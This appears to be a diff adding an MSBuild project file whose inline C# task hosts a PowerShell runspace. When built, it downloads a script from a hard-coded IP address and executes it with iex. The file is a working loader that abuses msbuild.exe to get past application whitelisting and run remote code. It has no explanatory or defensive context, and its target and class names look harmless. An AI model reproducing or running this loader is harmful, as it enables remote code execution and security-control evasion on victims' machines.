@@ -1,0 +1,50 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+	<Target Name="Hello">
+		<ClassExample />
+	</Target>
+	<UsingTask
+	    TaskName="ClassExample"
+	    TaskFactory="CodeTaskFactory"
+	    AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+		<Task>
+			<Reference Include="C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" />
+			<Code Type="Class" Language="cs">
+				<![CDATA[
+				using System;
+				using System.Runtime.InteropServices;
+				using Microsoft.Build.Framework;
+				using Microsoft.Build.Utilities;
+				using System.IO;
+				using System.Management.Automation;
+				using System.Management.Automation.Runspaces;
+				using System.Collections.ObjectModel;
+				
+				public class ClassExample :  Task, ITask
+				{
+					public override bool Execute()
+					{
+						Console.WriteLine("hai");
+			            string cmd = "(new-object net.webclient).downloadstring('http://192.168.49.83:8080/runps')|iex";
+			            
+			            Runspace rs = RunspaceFactory.CreateRunspace();
+			            rs.Open();
+
+			            // instantiate a PowerShell object
+			            PowerShell ps = PowerShell.Create();
+			            ps.Runspace = rs;
+
+			            ps.AddScript(cmd);
+			            Collection<PSObject> results = ps.Invoke();
+			            foreach (var result in results)
+			            {
+			                Console.WriteLine(result);
+			            }
+			            rs.Close();
+						return true;
+					}
+				}
+				]]>
+			</Code>
+		</Task>
+	</UsingTask>
+</Project>
